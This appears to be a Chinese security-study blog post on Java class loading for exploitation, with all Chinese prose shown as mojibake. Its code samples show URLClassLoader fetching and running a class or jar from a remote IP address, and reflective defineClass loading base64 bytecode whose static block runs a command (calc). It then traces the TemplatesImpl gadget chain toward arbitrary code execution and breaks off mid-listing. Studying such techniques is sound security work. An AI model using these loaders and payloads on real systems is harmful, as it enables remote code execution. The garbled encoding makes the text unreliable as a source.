URLä»¥/ç»“å°¾ï¼Œä¸”åè®®åä¸ºfileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³åœ¨æœ¬åœ°ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸ä¸ºfileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±» æœ¬åœ°åŠ è½½ .class æ–‡ä»¶\nå…¶å®éƒ½æ˜¯å‰é¢è¯´è¿‡çš„äº†ï¼Œä¸»è¦æ˜¯åŠ è½½classæ–‡ä»¶ï¼Œæ‰€ä»¥classæ–‡ä»¶ä¸èƒ½æœ‰åŒ…åã€‚\nReflection.javaå†…å®¹ï¼š\n1 2 3 4 5 6 7 public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; public Reflection(){ System.out.println(\u0026#34;è°ƒç”¨äº†Reflectionçš„æ„é€ å‡½æ•°\u0026#34;); } } Main.javaå†…å®¹;\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } å¯ä»¥å…ˆä½¿ç”¨javacå°†Reflection.javaæ‰“æˆReflection.classç„¶åæ”¾åœ¨Dç›˜ã€‚\næˆ‘çš„mavené¡¹ç›®æ˜¯è‡ªåŠ¨ç¼–è¯‘ç„¶åæ”¾åœ¨é¡¹ç›®ä¸­çš„targetç›®å½•ä¸‹çš„ï¼Œè¿™é‡Œç›´æ¥æ‰¾å°±è¡Œã€‚\nå¯åŠ¨æˆåŠŸè¾“å‡ºï¼š\n1 è°ƒç”¨äº†Reflectionçš„æ„é€ å‡½æ•° ä½†æ˜¯æˆ‘å‘ç°å¯ä»¥å¦‚ä¸‹åŠ è½½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 //è¿™ä¸ªReflectionç±»æ˜¯ç”±åŒ…åçš„ package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); clazz.newInstance(); } } ä»¥æ­¤ç±»æ¨å§ï¼Œå¯¹äºclassæ–‡ä»¶ä¹Ÿä¸ä¸€å®šæ˜¯å¿…é¡»æ²¡æœ‰åŒ…åï¼ŒåŠ è½½æ—¶åŠ ä¸Šè½¯ä»¶åŒ…å³å¯ï¼Œåé¢å°±ä¸è¡¥å……äº†ã€‚\nè¿œç¨‹åŠ è½½ .class æ–‡ä»¶\nå…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œè¯•ä¸€ä¸‹è¿œç¨‹åŠ è½½è‡ªå·±vpsä¸Šçš„classæ–‡ä»¶ï¼Œä½†æ„Ÿè§‰åº”è¯¥ä¸è¡Œï¼Œåº”è¯¥æ˜¯æœ‰ä»€ä¹ˆå®‰å…¨ç­–ç•¥çš„ã€‚è‡ªå·±ç¼–å†™ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/Reflection.class\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } ç„¶åå°†æœ¬åœ°çš„Reflection.javaæ–‡ä»¶åˆ é™¤ï¼Œå†æ¥è¿è¡Œï¼Œå‘ç°æŠ¥é”™å¦‚ä¸‹:\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Reflection at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:9) å¯èƒ½æ˜¯URLè·¯å¾„é—®é¢˜ï¼Œè¿™æ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹å‰é¢è®²çš„åŸºç¡€è·¯å¾„ï¼Œå°è¯•ä¸€ä¸‹ç”¨jaråŒ…å‘¢ï¼Œæ‰€ä»¥æˆ‘å°†æ„å»ºjaråŒ…çš„ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 public class MyTest{ public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†è¿œç¨‹urlç±»çš„æ„é€ å‡½æ•°\u0026#34;); } } ç„¶åä¼ åˆ°æœåŠ¡å™¨ä¸Šå³å¯ï¼Œå¦‚ä¸‹å°è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/jar_build.jar\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); clazz.newInstance(); } } æˆåŠŸè°ƒç”¨å¹¶è¾“å‡ºï¼š\n1 è°ƒç”¨äº†è¿œç¨‹urlç±»çš„æ„é€ å‡½æ•° è¿™æ ·ç”¨ç¬¦åˆåŸºç¡€è·¯å¾„çš„æ ¼å¼æˆåŠŸè°ƒç”¨äº†è¿œç¨‹çš„classä»£ç ã€‚æ„Ÿè§‰åˆ©ç”¨ç‚¹å¾ˆå¤§å‘¢ã€‚\nåˆ©ç”¨defineClass()ç›´æ¥åŠ è½½å­—èŠ‚ç  åœ¨ä¹‹å‰çš„è°ƒè¯•ä¸­ï¼Œå¯ä»¥çŸ¥é“JavaåŠ è½½éƒ½éœ€è¦ç»è¿‡ï¼š\n1 ClassLoader.loadClass -\u0026gt; ClassLoader.findClass -\u0026gt; ClassLoader.defineClass å…¶ä¸­ï¼š\nloadClassçš„ä½œç”¨æ˜¯ä»å·²ç»åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆåŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹æ‰§è¡ŒfindClass findClassçš„ä½œç”¨å°±æ˜¯æ ¹æ®åŸºç¡€URLåˆ¶å®šçš„æ–¹å¼æ¥æŸ¥æ‰¾ç±»ï¼Œè¯»å–å­—èŠ‚ç åäº¤ç»™defineClass defineClassçš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» defineClasså†³å®šå¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬æ¢å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJavaé»˜è®¤çš„ClassLoader.defineClassæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼ˆCè¯­è¨€å®ç°ï¼‰ï¼š\nåˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\nåˆ©ç”¨åå°„è·å–defineClassæ–¹æ³•\n1 2 3 4 5 6 7 8 import java.lang.reflect.Method; public class Main{ public static void main(String[] args){ Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class, int.class, int.class); method.setAccessible(true); } } æ­¤æ—¶Text.javaå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.Runtime; public class Text{ static{ try{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); }catch(Exception e){ System.out.println(\u0026#34;å¼‚å¸¸é€€å‡º\u0026#34;); } } } //è¿˜æ˜¯éœ€è¦æ³¨æ„classæ–‡ä»¶è¦æ²¡æœ‰åŒ…å å°†å…¶è½¬æ¢ä¸ºclassæ–‡ä»¶åå†è½¬æ¢ä¸ºbase64ç¼–ç ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.nio.file.*; import java.util.Base64; public class FileToBase64 { public static void main(String[] args) { String filePath = \u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;; // è¯·æ›¿æ¢æˆä½ å®é™…çš„æ–‡ä»¶è·¯å¾„ try { byte[] fileBytes = readFileToByteArray(filePath); String base64Encoded = encodeBase64(fileBytes); System.out.println(\u0026#34;Base64 Encoded Content:\u0026#34;); System.out.println(base64Encoded); } catch (Exception e) { e.printStackTrace(); } } public static byte[] readFileToByteArray(String filePath) throws Exception { return Files.readAllBytes(Paths.get(filePath)); } public static String encodeBase64(byte[] data) { return Base64.getEncoder().encodeToString(data); } } //ä¹Ÿå¯ä»¥javacç¼–è¯‘ï¼Œç„¶åcatè¾“å‡ºæ˜¯Base64ç¼–ç ä¸€ä¸‹ï¼Œå°±æ˜¯éœ€è¦æ³¨æ„ideaå’Œjavacè¿è¡Œçš„JDKç‰ˆæœ¬è¦ç›¸åŒã€‚ å†ä½¿ç”¨base64è§£ç å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„å­—èŠ‚ç äº†ï¼Œå¦‚ä¸‹ï¼š\n1 byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAKgoACAAbCgAcAB0IAB4KABwAHwcAIAoABQAhBwAiBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAAg8Y2xpbml0PgEAAXgBABNMamF2YS9sYW5nL1J1bnRpbWU7AQABeQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAgAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACQAKBwAkDAAlACYBAARjYWxjDAAnACgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAApAAoBAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAEAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAIEAAgACAAAAFrgAAksSA0wqK7YABFenAAhLKrYABrEAAQAAAA0AEAAFAAMADAAAAB4ABwAAAAcABAAIAAcACQANAAwAEAAKABEACwAVAA0ADQAAACAAAwAEAAkAEQASAAAABwAGABMAFAABABEABAAVABYAAAAXAAAABwACUAcAGAQAAQAZAAAAAgAa\u0026#34;); åŠ è½½å­—èŠ‚ç æˆClasså¯¹è±¡ï¼Œç„¶åå®ä¾‹åŒ–æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡\n1 2 3 Class Test = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Test\u0026#34;, code, 0, code.length); Test.newInstance(); //ClassLoader.getSystemClassLoader()è¿”å›ç³»ç»Ÿçš„ç±»åŠ è½½å™¨å¯¹è±¡ è¿™é‡Œæ˜¯å› ä¸ºdefineClass()æ–¹æ³•æ˜¯ä¸€ä¸ªå®ä¾‹æ–¹æ³•ã€‚æ‰€ä»¥å¯ä»¥éœ€è¦ç”¨ä¸€ä¸ªå®ä¾‹å¯¹è±¡å³å¯ï¼Œæ‰€ä»¥æœ€ç»ˆå¦‚ä¸‹è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.ClassLoader; import java.util.Base64; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAMQoACgAZCgAaABsIABwKABoAHQcAHgkAHwAgCAAhCgAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxUZXh0OwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB4BAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAALAAwHACYMACcAKAEABGNhbGMMACkAKgEAE2phdmEvbGFuZy9FeGNlcHRpb24HACsMACwALQEADOW8guW4uOmAgOWHugcALgwALwAwAQAEVGV4dAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAAAwAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABlAAIAAQAAABa4AAISA7YABFenAAxLsgAGEge2AAixAAEAAAAJAAwABQADAA4AAAAWAAUAAAAGAAkACQAMAAcADQAIABUACgAPAAAADAABAA0ACAATABQAAAAVAAAABwACTAcAFggAAQAXAAAAAgAY\u0026#34;); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nä½¿ç”¨javacç›®å½•çš„è¯å°±éœ€è¦æ³¨æ„JDKçš„ç‰ˆæœ¬é—®é¢˜ï¼Œéœ€è¦ä¸€è‡´ã€‚\nåœ¨å‰é¢çš„POCä¸­è°ƒç”¨æ–¹æ³•æ—¶æ˜¯ç”¨çš„AppClassLoaderå®ä¾‹ï¼Œä¹Ÿæ˜¯æ‰çŸ¥é“åŸæ¥è¿™é‡Œè¿”å›çš„ClassLoaderæ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¿™æ ·ç”¨å‘¢ã€‚å¤§æ¦‚æƒ³ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œç”±äºdefineClass()æ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œæ‰€ä»¥å½“è°ƒç”¨invoke()æ–¹æ³•æ—¶éœ€è¦ä¸€ä¸ªå®ä¾‹ï¼Œå³éœ€è¦ä¸€ä¸ªClassLoaderçš„å®ä¾‹æ¥è°ƒç”¨å®ƒã€‚è¿™é‡Œå°±æ˜¯ç”¨AppClassLoaderç±»åŠ è½½å™¨æ¥åŠ è½½Textç±»ï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ„æ€ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nåŒæ ·çš„å¯ä»¥ç›´æ¥åˆ©ç”¨IOè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;)); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } åŒæ—¶è¦æƒ³åˆ°è¿™é‡Œæ—¢ç„¶å¯ä»¥åˆ©ç”¨defineClass()æ–¹æ³•ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ—¶å€™ä¹Ÿè¦æƒ³åˆ°è¿™ä¸€ç‚¹ï¼Œä¹Ÿè®¸å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚\nåœ¨defineClassè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œè€Œä¸”å³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨defineClassæ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨defineClassåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚\nä¸€å®šè¦æ³¨æ„çš„æ˜¯ï¼šç”±äºç³»ç»Ÿçš„ClassLoader#defineClassæ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œå¿…é¡»ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚\nåœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸ºdefineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾TemplateImplçš„åŸºçŸ³\nåˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°defineClassæ–¹æ³•ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼Œè¿™å°±æ˜¯TemplatesImplã€‚\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»TransletClassLoaderï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static final class TransletClassLoader extends ClassLoader { private final Map\u0026lt;String,Class\u0026gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) { super(parent); _loadedExternalExtensionFunctions = null; } TransletClassLoader(ClassLoader parent,Map\u0026lt;String, Class\u0026gt; mapEF) { super(parent); _loadedExternalExtensionFunctions = mapEF; } public Class\u0026lt;?\u0026gt; loadClass(String name) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; ret = null; if (_loadedExternalExtensionFunctions != null) { ret = _loadedExternalExtensionFunctions.get(name); } if (ret == null) { ret = super.loadClass(name); } return ret; } Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } } è¿™ä¸ªç±»ç»§æ‰¿è‡ªClassLoaderç±»ï¼Œå¹¶ä¸”é‡å†™äº†defineClassæ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªé™æ€ç±»ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾ç¤ºåœ°å£°æ˜å…¶å®šä¹‰åŸŸï¼Œé‚£ä¹ˆå®ƒçš„ä½œç”¨åŸŸå°±æ˜¯defaultï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚\næ³¨æ„çœ‹å®ƒçš„defineClass()æ–¹æ³•ï¼Œå’Œå‰é¢è¯´çš„åˆ©ç”¨çš„defineClassè°ƒç”¨çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œå¯ä»¥å°è¯•è°ƒç”¨ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯åªä¼ å…¥äº†byteï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œæœ¬æ¥è¿™ä¸ªé‡ç‚¹åº”è¯¥å°±æ˜¯å­—èŠ‚ç ã€‚\né‚£ä¹ˆç°åœ¨ä» TransletClassLoader#defineClass() å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š\n1 2 3 TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() é‚£ç°åœ¨æ¥è·Ÿä¸€ä¸‹è¿™ä¸ªè°ƒç”¨é“¾ï¼Œä»åå¾€å‰ã€‚\næˆ‘ä»¬çœ‹TemplatesImpl#defineTransletClasses()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) {//æ³¨æ„è¿™é‡Œ ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); +++++++ for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è°ƒç”¨äº†TransletClassLoaderç±»çš„defineClass()æ–¹æ³•ï¼Œè¿™é‡Œä¸å°±æ­£å¥½å¯¹åº”å‰é¢è°ƒç”¨çš„æ–¹æ³•äº†å—ã€‚\nç„¶åçœ‹å…¶ä»–ç‚¹ï¼š\né¦–å…ˆéœ€è¦_bytecodesä¸ç­‰äºnull\nä»¥åŠåœ¨è¿™ä¸ªTemplatesImplç±»ä¸­çš„å±æ€§ï¼š\nå¦åˆ™æ˜¯æ— æ³•è¿›è¡Œåé¢å‡ æ­¥çš„ã€‚\nä½†æ˜¯åœ¨TemplatesImplç±»ä¸­ï¼Œè¿™ä¸ªå˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 private byte[][] _bytecodes = null; è¿™é‡Œçš„_bytecodeså®šä¹‰ä¸ºç§æœ‰çš„å¹¶ä¸”æ²¡æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒï¼Œåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨åå°„è·å–å¹¶ä¿®æ”¹é‚£ä¸ªå˜é‡ã€‚\nè¿˜æœ‰çš„å…¶ä»–éœ€è¦æ³¨æ„çš„ç‚¹ï¼ŒdefineTransletClassesæ–¹æ³•ä¸­ä¼šæ‰§è¡Œä¸€ä¸ªrunæ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯ä¹‹å‰è¯´çš„å®ä¾‹åŒ–TransletClassLoaderç±»çš„ä»£ç ã€‚è¿™é‡Œä¸ºäº†é˜²æ­¢æŠ¥é”™æ‰€ä»¥_tfactoryä¸èƒ½ä¸ºç©ºï¼Œæ¥çœ‹ä¸€ä¸‹TemplatesImpleç±»ä¸­çš„_tfactoryçš„åˆå€¼ï¼š\n1 private transient TransformerFactoryImpl _tfactory = null; å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„å˜é‡_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTranformerFactoryImplç±»å‹çš„æ•°æ®ï¼Œå¹¶ä¸”åœ¨runæ–¹æ³•ä¸­è¦æ‰§è¡Œçš„å°±æ˜¯_tfactoryå˜é‡çš„æ–¹æ³•ã€‚æ‰€ä»¥è¿™é‡Œç›´æ¥å°†è¿™ä¸ª_tfactoryå˜é‡èµ‹å€¼ä¸ºTransformerFactoryImplç±»å®ä¾‹å³å¯ã€‚\nç°åœ¨ç»§ç»­çœ‹å“ªé‡Œä½¿ç”¨è¿‡è¿™ä¸ªdefineTransletClasses()æ–¹æ³•ï¼Œæœç´¢ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //ç¬¬ä¸€ä¸ªï¼š private synchronized Class[] getTransletClasses() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _class; } //ç¬¬äºŒä¸ªï¼š public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } //ç¬¬ä¸‰ä¸ª(éƒ¨åˆ†ä»£ç )ï¼š private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ............... return translet; } catch (TransformerConfigurationException e) { // Falls through } } ç¬¬ä¸€ä¸ªæ–¹æ³•ä¸ºç§æœ‰ï¼Œå¾€ä¸Šè°ƒç”¨ï¼Œæ²¡æœ‰ä»€ä¹ˆæ–¹æ³•ä½¿ç”¨è¿‡ï¼Œé‚£ä¹ˆå°±åªæœ‰æ”¾å¼ƒã€‚\nç¬¬äºŒä¸ªæ–¹æ³•ä¸ºpublicï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯æœ‰é™åˆ¶ï¼Œåé¢ä¼šè¯´ã€‚\nç¬¬ä¸‰ä¸ªæ–¹æ³•å‘ä¸Šè°ƒç”¨å‘ç°æœ‰ä¸€ä¸ªæ–¹æ³•è°ƒç”¨äº†ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªpublicæ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } é‚£ä¹ˆç°åœ¨çš„æ€è·¯å°±æ˜¯å®ä¾‹åŒ–TemplatesImplå¯¹è±¡åç›´æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•å°±èƒ½ç›´æ¥ä½¿ç”¨ã€‚\nç°åœ¨æ¥çœ‹çœ‹ä½¿ç”¨çš„æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œ\n1 2 3 4 5 6 7 8 9 10 